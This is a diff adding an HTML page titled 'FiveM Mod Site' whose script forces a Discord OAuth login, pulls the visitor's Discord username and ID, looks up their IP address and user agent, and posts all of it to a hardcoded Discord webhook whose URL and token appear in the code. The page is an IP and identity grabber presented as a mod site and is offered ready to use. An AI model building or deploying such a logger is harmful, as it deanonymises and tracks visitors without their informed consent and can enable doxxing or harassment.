@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FiveM Mod Site</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0a0a;
+            color: #e5e5e5;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .card {
+            background: #111111;
+            border: 1px solid #1a1a1a;
+            border-radius: 16px;
+            padding: 40px;
+            max-width: 600px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+        }
+        .loading {
+            text-align: center;
+            color: #6b7280;
+            font-family: monospace;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .hidden {
+            display: none !important;
+        }
+        .watcher {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            border-bottom: 1px solid #1a1a1a;
+            padding-bottom: 20px;
+            margin-bottom: 24px;
+        }
+        .watcher img {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: 2px solid #22c55e;
+        }
+        .watcher .info {
+            flex: 1;
+        }
+        .watcher .info .name {
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+        }
+        .watcher .info .id {
+            font-size: 12px;
+            color: #6b7280;
+            font-family: monospace;
+        }
+        .badge {
+            background: #1a1a1a;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            color: #22c55e;
+            border: 1px solid #22c55e33;
+            font-family: monospace;
+        }
+        .ip-box {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 16px 0;
+            font-family: monospace;
+            font-size: 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .ip-box .label {
+            color: #6b7280;
+        }
+        .ip-box .value {
+            color: #22c55e;
+        }
+        .footer {
+            margin-top: 24px;
+            font-size: 11px;
+            color: #374151;
+            text-align: center;
+        }
+        .webhook-status {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            padding: 16px;
+            margin-top: 16px;
+            font-size: 12px;
+            color: #6b7280;
+            font-family: monospace;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+        .webhook-status .success {
+            color: #22c55e;
+        }
+        .webhook-status .error {
+            color: #ef4444;
+        }
+        .status-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #22c55e;
+            margin-right: 8px;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card" id="app">
+    <!-- LOADING -->
+    <div id="loading" class="loading">
+        <div>🔍 Authenticating with Discord...</div>
+    </div>
+
+    <!-- CONTENT (hidden until loaded) -->
+    <div id="content" class="hidden">
+        <div class="watcher">
+            <img id="avatar" src="" alt="avatar">
+            <div class="info">
+                <div class="name" id="username">Loading...</div>
+                <div class="id" id="discordId">ID: loading...</div>
+            </div>
+            <span class="badge">● WATCHER</span>
+        </div>
+
+        <div class="ip-box">
+            <span class="label">📡 IP ADDRESS</span>
+            <span class="value" id="ipDisplay">fetching...</span>
+        </div>
+
+        <div class="webhook-status" id="webhookStatus">
+            <span class="success">●</span> Sending to webhook...
+        </div>
+    </div>
+</div>
+
+<div class="footer">
+    FiveM Mod Site — Discord + IP → Webhook
+</div>
+
+<script>
+    // ============================================================
+    // CONFIG — YOUR WEBHOOK URL (HARDCODED)
+    // ============================================================
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW';
+    const CLIENT_ID = '1351732780288376902'; // <- YOUR DISCORD CLIENT ID
+
+    // ============================================================
+    // DOM REFS
+    // ============================================================
+    const loadingEl = document.getElementById('loading');
+    const contentEl = document.getElementById('content');
+    const avatarEl = document.getElementById('avatar');
+    const usernameEl = document.getElementById('username');
+    const discordIdEl = document.getElementById('discordId');
+    const ipDisplayEl = document.getElementById('ipDisplay');
+    const webhookStatusEl = document.getElementById('webhookStatus');
+
+    // ============================================================
+    // LOG TO WEBHOOK STATUS BOX
+    // ============================================================
+    function setStatus(msg, type = 'success') {
+        const color = type === 'success' ? '#22c55e' : '#ef4444';
+        webhookStatusEl.innerHTML = `<span style="color:${color}">●</span> ${msg}`;
+    }
+
+    // ============================================================
+    // GET IP
+    // ============================================================
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch {
+            return 'unknown';
+        }
+    }
+
+    // ============================================================
+    // SEND TO WEBHOOK
+    // ============================================================
+    async function sendToWebhook(discordUser, ip) {
+        const displayName = discordUser.global_name || discordUser.username;
+        const timestamp = new Date().toLocaleString();
+
+        const payload = {
+            content: `**👁️ NEW VISITOR LOGGED**\n` +
+                     `**Discord:** ${displayName} (${discordUser.id})\n` +
+                     `**IP:** ${ip}\n` +
+                     `**User-Agent:** ${navigator.userAgent}\n` +
+                     `**Timestamp:** ${timestamp}`
+        };
+
+        try {
+            const res = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            if (res.ok) {
+                setStatus(`✅ Webhook sent! ${displayName} (${discordUser.id}) from ${ip}`, 'success');
+            } else {
+                setStatus(`❌ Webhook failed: ${res.status} ${res.statusText}`, 'error');
+            }
+        } catch (err) {
+            setStatus(`❌ Webhook error: ${err.message}`, 'error');
+        }
+    }
+
+    // ============================================================
+    // DISCORD OAUTH — get user info from token
+    // ============================================================
+    async function getDiscordUser(accessToken) {
+        try {
+            const res = await fetch('https://discord.com/api/users/@me', {
+                headers: { Authorization: `Bearer ${accessToken}` }
+            });
+            return await res.json();
+        } catch {
+            return null;
+        }
+    }
+
+    // ============================================================
+    // INIT — main flow
+    // ============================================================
+    async function init() {
+        // Check for OAuth token in URL hash
+        const hash = window.location.hash.substring(1);
+        const params = new URLSearchParams(hash);
+        const accessToken = params.get('access_token');
+
+        if (accessToken) {
+            // We have a token — fetch user
+            const user = await getDiscordUser(accessToken);
+            if (user && user.id) {
+                // Clean URL
+                window.history.replaceState({}, document.title, window.location.pathname);
+
+                // Get IP
+                const ip = await getIP();
+
+                // Show UI
+                showUser(user);
+                ipDisplayEl.textContent = ip;
+                setStatus(`📤 Sending ${user.username} (${user.id}) from ${ip}...`, 'success');
+
+                // Send to webhook
+                await sendToWebhook(user, ip);
+
+                return;
+            } else {
+                setStatus('❌ Failed to get user info from Discord', 'error');
+                // Fall through to login
+            }
+        }
+
+        // No token — redirect to Discord OAuth
+        const redirectUri = window.location.origin + window.location.pathname;
+        const scope = 'identify';
+        const url = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=${scope}`;
+        window.location.href = url;
+    }
+
+    // ============================================================
+    // SHOW USER UI
+    // ============================================================
+    function showUser(user) {
+        loadingEl.classList.add('hidden');
+        contentEl.classList.remove('hidden');
+
+        const displayName = user.global_name || user.username;
+        usernameEl.textContent = `${displayName}#${user.discriminator}`;
+        discordIdEl.textContent = `ID: ${user.id}`;
+
+        if (user.avatar) {
+            avatarEl.src = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=64`;
+        } else {
+            avatarEl.src = 'https://cdn.discordapp.com/embed/avatars/0.png';
+        }
+    }
+
+    // ============================================================
+    // START
+    // ============================================================
+    init();
+</script>
+
+</body>
+</html>
